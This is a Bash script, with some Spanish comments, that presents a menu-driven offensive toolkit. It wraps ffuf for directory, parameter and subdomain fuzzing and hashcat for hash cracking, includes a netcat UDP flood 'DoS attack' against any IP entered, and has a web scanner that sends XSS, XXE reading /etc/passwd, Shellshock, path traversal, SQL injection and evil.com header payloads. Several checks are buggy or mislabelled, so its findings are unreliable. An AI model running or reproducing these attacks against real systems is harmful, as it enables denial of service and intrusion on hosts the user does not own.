#!/bin/bash

# Color Definitions
C=$(printf '\033')
RED="${C}[1;31m"
GREEN="${C}[1;32m"
YELLOW="${C}[1;33m"
BLUE="${C}[1;34m"
MAGENTA="${C}[1;35m"
CYAN="${C}[1;36m"
LIGHT_GRAY="${C}[1;37m"
DARK_GRAY="${C}[1;90m"
NC="${C}[0m" # No Color
UNDERLINED="${C}[4m"
ITALIC="${C}[3m"
PARPADEO="${C}[1;5m"

# Report time mark
date=$(date +'%d_%m_%Y_%H%M%S')
report="report_$date.txt"
line=$(printf "%0.s-" {1..50})

write_report() {
	local message=$1
        echo -e "$message" >> $report
}
line() {
        echo "$line" >>$report
}


check_permission() {
    if [ "$EUID" -ne 0 ]; then
        write_report "${YELLOW}[WARNING]${NC} This script is not running as root. Some information might be incomplete."
        line
    fi
}

validate_ip() {
	local ip=$1
	#Ipv4
	if [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
		IFS='.' read -r -a octetos <<< "$ip"
		for octeto in "${octetos[@]}"; do
			if (( octeto < 0 || octeto > 255 )); then
				echo "La direccion $ip es invalida"
				return 1
			fi
		done
		echo "La direccion $ip es valida"
		return 0
	fi
}

menu() {
	clear
	echo "Choose an option"
	echo

	#Con printf se puede alinear las columnas con un ancho fijo
	printf "%-30s %-30s\n" "1. Proxy checker" "2. Fuzzing web"
	printf "%-30s %-30s\n" "3. DoS attack" "4. Population growth"
	printf "%-30s %-30s\n" "5. Web vulnerabilities" "6. Hash breaker"
	printf "%-30s %-30s\n" "7. Encrypter" "8. Exit"
	echo
	read -p "Set number  [1-8]: " option

	case $option in
		1) proxy_checker ;;
		2) fuzzing_tool ;;
		3) dos_attack ;;
		4) population_growth ;;
		5) vuln_web ;;
		6) hash_menu ;;
		7) encrypter ;;
		8) exit ;;
		*) echo "${YELLOW}[Invalid option selected, try it again]${NC}" ;;
	esac
}

proxy_checker() {
	echo "${GREEN}Proxy Checker${NC}"
	echo
	echo "This proxy checker can work with files or unique ip"
	echo "To work with files enter \"f\" else you will work with ip"
	echo
	read -p "What would you like to work with? " fiip
	case $fiip in
		f) file_check ;;
		*) ip_check ;;
	esac
}
file_check() {
	write_report "${GREEN}${UNDERLINED}Proxy list:${NC}"
	echo "Please put the exact name of the file u want to check"
	read -p "File name: " file_name

	if [ -f $file_name ]; then

		while IFS= read -r proxy; do
			#Read ip and port and take first part and second
			ip=$(echo $proxy | cut -d: -f1)
			port=$(echo $proxy | cut -d: -f2)
			#Check proxy
			if curl -s --proxy "$proxy" --max-time 10 https://www.google.com -o /dev/null; then
				echo "Proxy $proxy is active"
				write_report "$proxy"
			else
				echo "Proxy $proxy doesn't work"
			fi
		done < "$file_name"
	else
		echo "This file doesn't exist"
		exit 1
	fi


}
ip_check() {
	echo "${GREEN}Ip Checker ${NC}"
	while true; do
		read -p "Enter ip: " ip
		if validate_ip "$ip"; then
			break
		fi
	done
	read -p "Enter port(Default 8080): " port
	port=${port:-8080}


	if curl -s --proxy "$ip:$port" --max-time 10 https://www.google.com -o /dev/null; then
		echo "Proxy $ip:$port is active"
	else
		echo "Proxy $ip:$port isn't active"
	fi


}
fuzz_menu(){
	echo
        echo "Choose an option"
        echo

        #Con printf se puede alinear las columnas con un ancho fijo
        printf "%-30s %-30s\n" "1. Directory fuzzing" "2. Get Fuzzing"
        printf "%-30s %-30s\n" "3. Post Fuzzing" "4. Subdomain fuzzing"
        echo
        read -p "Set number [1-4]: " option

}
fuzzing_tool() {
	clear
	echo "${GREEN}Fuzzing tool${NC}"
	fuzz_menu

	read -p "Enter the URL to realize fuzzing: " url
	regex='^((https?|ftp):\/\/)?([a-zA-Z0-9.-]+)(:[0-9]{1,5})?(\/.*)?$'
	aaregex='^(https?://)?([^/]+)(/.*)?'
	if [[ "$url" =~ $regex ]]; then
		all="${BASH_REMATCH[0]}"
		prefix="${BASH_REMATCH[1]}"
		domain="${BASH_REMATCH[3]}"
		port="${BASH_REMATCH[4]}"
		rest="${BASH_REMATCH[5]}"
	else
		echo "${RED}This url is not valid${NC}"
		exit 1

	fi


	read -p "Set path to wordlist: " wordlist

	if ! [[ -f "$wordlist" ]]; then
		echo "${RED}The wordlist file is unreachable.${NC}"
		exit 2
	fi

	case $option in
		1)
			echo "Directory fuzzing"
			echo "1)Only 200 response 2) Ignore empty responses 3) Ignore 18 words *)No filters "
			read -p "Do you want to add a filter(1-2-3-none): " filter
			case $filter in
   				 1)
				        if [[ -z "${port}" ]]; then
      					      command="ffuf -u ${url%/}/FUZZ -w ${wordlist} -mc 200"
       					 else
            					command="ffuf -u ${url%/}:${port}/FUZZ -w ${wordlist} -mc 200"
        				fi
        				eval "$command"
       					;;
    				2)
        				if [[ -z "${port}" ]]; then
            					command="ffuf -u ${url%/}/FUZZ -w ${wordlist} -fs 0"
        				else
            					command="ffuf -u ${url%/}:${port}/FUZZ -w ${wordlist} -fs 0"
        				fi
        				eval "$command"
        				;;
    				3)
        				if [[ -z "${port}" ]]; then
            					command="ffuf -u ${url%/}/FUZZ -w ${wordlist} -fw 18"
        				else
            					command="ffuf -u ${url%/}:${port}/FUZZ -w ${wordlist} -fw 18"
        				fi
        				eval "$command"
        				;;
    				*)
        				if [[ -z "${port}" ]]; then
            					command="ffuf -u ${url%/}/FUZZ -w ${wordlist}"
        				else
            					command="ffuf -u ${url%/}:${port}/FUZZ -w ${wordlist}"
        				fi
        				eval "$command"
        			;;
			esac
			;;
		2)
			echo "Get fuzzing"
			echo "ffuf -u ${url}${YELLOW}?query=${NC}FUZZ -w ${wordlist}"
			echo "The URL has to be entered up to ?query${BLUE}=${NC}"
			echo
			echo
			echo "1)Only 200 response 2) Ignore empty responses 3) Ignore 18 words *)No filters "
                        read -p "Do you want to add a filter(1-2-3-none): " filter
                        case $filter in
                                1)
					command="ffuf -u ${all}FUZZ -w ${wordlist} -mc 200"
                                        eval "$command"
                                        ;;
                                2)
					command="ffuf -u ${all}FUZZ -w ${wordlist} -fs 0"
                                        eval "$command"
                                        ;;
                                3)
					command="ffuf -u ${all}FUZZ -w ${wordlist} -fw 18"
                                        eval "$command"
                                        ;;
                                *)
					command="ffuf -u ${all}FUZZ -w ${wordlist}"
                                        eval "$command"
                                        ;;
				esac
				;;
		3)
			echo "Post fuzzing"
			read -p "Set POST data (example: username=admin&password=FUZZ): " post_data
			echo
                        echo "1)Only 200 response 2) Ignore empty responses 3) Ignore 18 words *)No filters "
                        read -p "Do you want to add a filter(1-2-3-none): " filter
                        case $filter in
                                1)
					command="ffuf -u ${prefix}${domain}${port:-80}${rest} -X POST -d \"${post_data}\" -w ${wordlist} -mc 200"
                                        eval "$command"
                                        ;;
                                2)
					command="ffuf -u ${prefix}${domain}${port:-80}${rest} -X POST -d \"${post_data}\" -w ${wordlist} -fs 0"
                                        eval "$command"
                                        ;;
                                3)
					command="ffuf -u ${prefix}${domain}${port:-80}${rest} -X POST -d \"${post_data}\" -w ${wordlist} -fw 18"
                                        eval "$command"
                                        ;;
                                *)
					command="ffuf -u ${prefix}${domain}${port:-80}${rest} -X POST -d \"${post_data}\" -w ${wordlist}"
                                        eval "$command"
                                        ;;
				esac
				;;
		4)
			echo "Subdomain fuzzing"

                        echo
                        echo "1)Only 200 response 2) Ignore empty responses 3) Ignore 18 words *)No filters "
                        read -p "Do you want to add a filter(1-2-3-none): " filter
                        case $filter in
                                1)
					command="ffuf -u ${prefix}FUZZ.${domain}${port:-80}/ -w ${wordlist} -H \"Host: FUZZ.${domain}\" -mc 200"
                                        eval "$command"
                                        ;;
                                2)
					command="ffuf -u ${prefix}FUZZ.${domain}${port:-80}/ -w ${wordlist} -H \"Host: FUZZ.${domain}\" -fs 0"
                                        eval "$command"
                                        ;;
                                3)
					command="ffuf -u ${prefix}FUZZ.${domain}${port:-80}/ -w ${wordlist} -H \"Host: FUZZ.${domain}\" -fw 18"
                                        eval "$command"
                                        ;;
                                *)
					command="ffuf -u ${prefix}FUZZ.${domain}${port:-80}/ -w ${wordlist} -H \"Host: FUZZ.${domain}\" "
                                        eval "$command"
                                        ;;
				esac
				;;
		*)
			echo "No way"
			exit 3
			;;
	esac

}
dos_attack(){
	clear
	echo "${GREEN}DoS tool${NC}"
	while true; do
                read -p "Enter ip u want to service deny: " ip
                if validate_ip "$ip"; then
                        break
                fi
        done

	message=$(head -c 1024 /dev/urandom | tr -dc 'A-Za-z0-9')

	read -p "Set the port u want to flood(80 as default)" port_flood
	port_flood=${port_flood:-80}

	echo
	echo
	echo "This tool doesn't have ip spoofing"
	read -p "How many packages do u want to send(leave it empty and will be infinite): " pack_count
	if [[ -z "$pack_count" ]]; then
		echo "${BLUE}Starting attack...${NC}"
		echo "To stop press Ctrl+C"
		while true; do
			echo -n "$message" | nc -u "$ip" "$port_flood" -q 0 &
			sleep 0.01
		done
	else
		echo "Sending $pack_count packages to $ip $port"
		for  ((i = 1; i <= pack_count; i++)); do
			echo -n "$message" | nc -u "$ip" "$port_flood" -q 0 &
			sleep 0.01
		done
	fi

}


graphic_generator(){

	echo "[${BLUE}INFO${NC}]Generating graph..."

	#Temp archive
	datos=$(mktemp)

	Xn=$X_inicial
	for (( i=0; i<=max_iter; i++  ))
	do
		echo "$i $Xn" >> $datos
		Xn=$(echo "$b_growth * $Xn * (1 - $Xn)" | bc -l)

	        if (( $(echo "$Xn > $b_growth" | bc -l) )); then
        	    Xn=$b_growth
        	fi
    	done


    	gnuplot -persist 2>/dev/null <<-EOFMarker
        	set title "Modelo de Crecimiento de la Población"
        	set xlabel "Iteraciones"
        	set ylabel "Población"
        	set xrange [0:$max_iter]
        	set yrange [0:$b_growth]  # Ajustar el rango Y según el valor de B
        	set ytics 0.1
        	set grid
        	plot "$datos" with lines lw 2 title "B=$b_growth, X(0)=$X_inicial"
	EOFMarker

	rm $datos
}

population_growth(){
	if ! command -v gnuplot &> /dev/null; then
		echo "Install requirements."
		exit 4
	fi

	b_growth=0
	X=0
	max_iter=0
	clear
	echo "${BLUE}Population Growth${NC}"
	echo
	echo "Current values: "
	echo "B=$b_growth  X=$X iterations=$max_iter"
	read -p "Set new value to B(default 1.5): " b_growth
	b_growth=${b_growth:-1.5}
	echo "New value added B=$b_growth"
	read -p "Set initial value to X (between 0~1): " x_growth
	x_growth=${x_growth:-0.2}
	X_inicial=$x_growth
	echo "New value added X=$x_growth"
	read -p "Enter the iterations: " max_iter
	max_iter=${max_iter:-20}
	echo "New value added to iterations=$max_iter"

	if (( $(echo "$b_growth > 0" | bc -l) )) && (( $(echo "$x_growth >= 0" | bc -l) )) && (( $(echo "$x_growth <= 1" | bc -l) )); then
		graphic_generator
	else
		echo "Please enter valid values"
	fi



}

vuln_web(){
	echo "${GREEN}Vuln Web${NC}"
	echo
	read -p "Enter the url to check vulnerabilities: " url

        regex='^((https?|ftp):\/\/)?([a-zA-Z0-9.-]+)(:[0-9]{1,5})?(\/.*)?$'
        aaregex='^(https?://)?([^/]+)(/.*)?'
        if [[ "$url" =~ $regex ]]; then
                all="${BASH_REMATCH[0]}"
                prefix="${BASH_REMATCH[1]}"
                domain="${BASH_REMATCH[2]}"
                port="${BASH_REMATCH[3]}"
                rest="${BASH_REMATCH[4]}"
        else
                echo "${RED}This url is not valid${NC}"
                exit 1

        fi

	#Check XSS vulnerability
	response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d "<script>alert('XSS Vulnerability');</script" "$url")
	if [[ $response == *"<script>alert('XSS Vulnerability');</script"* ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to XSS"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to XSS"
	fi
	#Check SSRF (Server-Side Request Forgery)
	response=$(curl -s -H 'User-Agent: Mozilla/5.0' "$url?url=http://169.254.169.254/")
	if [[ $response == *"169.254.169.254"* ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to SSRF"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to SSRF"
	fi
	#Check XXE (XML External Entity)
	response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "$url")
	if [[ $response == *"root:x"* ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to XXE"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to XXE"
	fi
	#Check insecure deserialization vulnerability
	response=$(curl -s -H 'User-Agent: Mozilla/5.0' -d 'O:8:"stdClass":1:{s:5:"shell";s:5:"touch /tmp/pwned";}' "$url")
	if [[ -f "/tmp/pwned" ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to deserialization"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to deserialization"
	fi
	#Check Shellshock vulnerability (RCE)
	response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo vulnerable'" "$url")
	if [[ $response == *"vulnerable"* ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to shellshock"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to RCE shellshock"
	fi
	response=$(curl -s -H "User-Agent: () { :; }; /bin/bash -c 'echo SHELLSHOCK_RCE_DEMO'" "$url")
	if [[ $response == *"SHELLSHOCK_RCE_DEMO"* ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to shellshock"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to Shellsohck"
	fi
	#Check remote code execution (RCE)
	response=$(curl -s -H 'User-Agent: () { :;}; echo vulnerable' "$url")
	if [[ $response == *"vulnerable"* ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to RCE"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to RCE"
	fi

	#Check CSRF vulnerability (Cross-Site Request Forgery)
	response=$(curl -s -X POST -d 'token=test' "$url")
	if [[ $response == *"token=test"*  ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to CSRF"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to CSRF"
	fi
	#Check LFI vulnerability (Local FIle Inclusion)
	response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
	if [[ $response == *"root:"* ]]; then
		wirte_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to LFI"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to LFI"
	fi

	#Check open redirect vulnerability
	response=$(curl -s -L "$url?redirect=http://google.com")
	if [[ $response == *"<title>Google</title>"* ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to Open Redirect"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to open redirect"
	fi
	#Check Log4J vulnerability
	response=$(curl -s "$url/%20%20%20%20%20%20%20%20@org.apache.log4j.BasicConfigurator@configure()")
	if [[ $response == *"log4j"* ]]; then
		write_report "[${BLUE}VULNERABLE${NC}] Thir url looks vulnerable to Log4j"
	else
		echo "[${RED}INFO${NC}]This url is not vulnerable to Log4J"
	fi

	#Prueba de vulnerabilidad RFI (Remote File Inclusion)
	response=$(curl -s "$url?file=http://google.com")
	if [[ $response == *"<title>Google</title>"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to RFI"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to RFI"
	fi


	#Check transversal path vulnerability
	response=$(curl -s "$url/../../../../../../../../../../../../etc/passwd")
	if [[ $response == *"root:"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to transversal path"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to transversal path"
	fi


	# Common parameter names to test
	param_names=("id" "name" "user" "product" "item")

	# SQL injection payload
	payload="1'"
	vulnerable=false
	
	for param in "${param_names[@]}"; do
		test_url="${url}/index.php?${param}=${payload}"
		response=$(curl -s "$test_url")
		
		# Check if the response contains SQL syntax error patterns
		if echo "$response" | grep -q "SQL syntax"; then
			write_report "[${BLUE}VULNERABLE${NC}] Parameter '${param}' in the URL is vulnerable to SQL Injection"
			vulnerable=true
		fi
	done

	if [ "$vulnerable" = false ]; then
		echo "[${RED}INFO${NC}] None of the tested parameters appear vulnerable to SQL injection"
	fi


	#Check SQL injection
	#response=$(curl -s "$url/index.php?id=1'")
	#if [[ $response == *"SQL syntax"* ]]; then
     #           write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to SQL Injection"
	#else
    #            echo "[${RED}INFO${NC}]This url is not vulnerable to SQL injection"
	#fi
	

	#Check file upload vulnerability
	response=$(curl -s -F "file=@/etc/passwd" "$url/upload")
	if [[ $response == *"root:x"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to SQL Injection"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to file upload"
	fi
	#Check command injeciton
	response=$(curl -s -d "cmd=whoami" "$url/cmd")
	if [[ $response == *"root"* || $response == *"www-data"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to command injection"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to command injection"
	fi

	#Check host header injection
	response=$(curl -s -H 'Host: evil.com' "$url")
	if [[ $response == *"evil.com"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to header injection"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to header injection"
	fi

	#Check url redirection
	response=$(curl -s -L "$url?next=http://evil.com")
	if [[ $response == *"evil.com"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to URL redirection"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to url redirection"
	fi

	#Check http parameter pollution vulnerability (HPP)
	response=$(curl -s "$url?page=1&page=2")
	if [[ $response == *"page=2"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to HPP"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to HPP"
	fi
	#Check clickjacking
	response=$(curl -s -I "$url")
	if [[ $response != *"X-Frame-Options: DENY"* && $response != *"X-Frame-Options: SAMEORIGIN"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to Clickjacking"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to clickjacking"
	fi
	#Check bad conf, CORS (Cross-Origin Resource Sharing)
	response=$(curl -s -H "Origin: http://evil.com" -I "$url")
	if [[ $response == *"Access-Control-Allow-Origin: http://evil.com"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to CORS"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to CORS"
	fi
	#Check sensitive data
	response=$(curl -s "$url")
	if [[ $response == *"API_KEY"* || $response == *"password"* || $response == *"api"* || $response == *"uri"* || $response == *"login"* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to sensitive data"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to sensitive data"
	fi


	#Check Session fixation
	response=$(curl -s -I "$url")
	if [[ $response == *"Set-Cookie: sessionid="* || $response == *"csrftoken="* ]]; then
                write_report "[${BLUE}VULNERABLE${NC}] This url looks vulnerable to session fixation"
	else
                echo "[${RED}INFO${NC}]This url is not vulnerable to session fixation"
	fi

}
hash_menu(){
	clear
        echo "${GREEN}HASH BREAKER${NC}"
        echo

        #Con printf se puede alinear las columnas con un ancho fijo
        printf "%-30s %-30s\n" "1. Hash type" "2. Attack Type"
        printf "%-30s %-30s\n" "3. Wordlist" "4. HASHCAT"
        printf "%-30s %-30s\n" "5. Back"

        echo
        read -p "Set number  [1-5]: " option

	case $option in
		1)
			clear
 	       		printf "%-30s %-30s\n" "1. MD5" "2. SHA-256"
       		 	printf "%-30s %-30s\n" "3. SHA-1" "4. WPA"

			read -p "Set number [1-4]: " option

			case $option in
				1)
					hash_type=0;;
				2)
					hash_type=1400;;
				3)
					hash_type=100;;
				4)
					hash_type=2500;;
				*)
					hash_menu;;
			esac
			hash_menu
			;;
		2)
			clear
                        printf "%-30s %-30s\n" "1. Straight" "2. Combination"
                        printf "%-30s %-30s\n" "3. Brute-Force" "4. Hybrid wordlist + Mask"
			printf "%-30s %-30s\n" "5. Hybrid Mask + Wordlist" "6. Hash menu"

			read -p "Enter type attack [1-5]: " option

			case $option in
				1)
					attack_type=0;;
				2)
					attack_type=1;;
				3)
					attack_type=3;;
				4)
					attack_type=6;;
				5)
					attack_type=7;;
				*)
					hash_menu;;
			esac
			hash_menu
			;;
		3)
			clear
			read -p "Enter path of the wordlist u want to use: " wordlist
			if [[ -f "$wordlist" ]]; then
				wordlist=${wordlist:-/usr/share/wordlists/rockyou.txt}
			else
				wordlist="/usr/share/wordlists/rockyou.txt"
			fi
			hash_menu
			;;
		4)
			hash_breaker
			;;
		*)
			menu
			;;
		esac
}
hash_breaker(){
	echo "Check data is correct: "
	echo "Hash Type=${hash_type} -- Attack type=${attack_type} -- wordlist=${wordlist}"

	read -p "Is data correct[Y/N]? " checkin
	checkin=$(echo -n "$checkin" | tr '[:upper:]' '[:lower:]')
	if [ "$checkin" = "y" ]; then
		clear
		echo
		read -p "Enter hash: " hash
		echo "${hash}" > ./tmp_hash.txt
		hashcat -m $hash_type -a $attack_type ./tmp_hash.txt ${wordlist}
		rm tmp_hash.txt
	elif [ "$checkin" = "n" ]; then
		hash_menu
	else
		echo "This option is not valid."
	fi

}
encrypter(){
	clear
	echo "${GREEN}ENCRYPTER${NC}"
        echo
	read -p "Enter the password u want to crypt: " pass
	echo "Choose a type for hash"
	echo
	printf "%-30s %-30s\n" "1. MD5" "2. SHA-256"
        printf "%-30s %-30s\n" "3. SHA-512" "4. SHA-1"
        printf "%-30s %-30s\n" "5. SHA3-512" "6. Back"

	read -p "Enter what type of hash u want to crypt[1-5]: " option
	case $option in
		1) echo -n "$pass" | openssl dgst -md5 ;;
		2) echo -n "$pass" | openssl dgst -SHA256 ;;
		3) echo -n "$pass" | openssl dgst -SHA512 ;;
		4) echo -n "$pass" | openssl dgst -sha1 ;;
		5) echo -n "$pass" | openssl dgst -sha3-512 ;;
		6) menu ;;
		*) menu ;;
	esac

}

menu
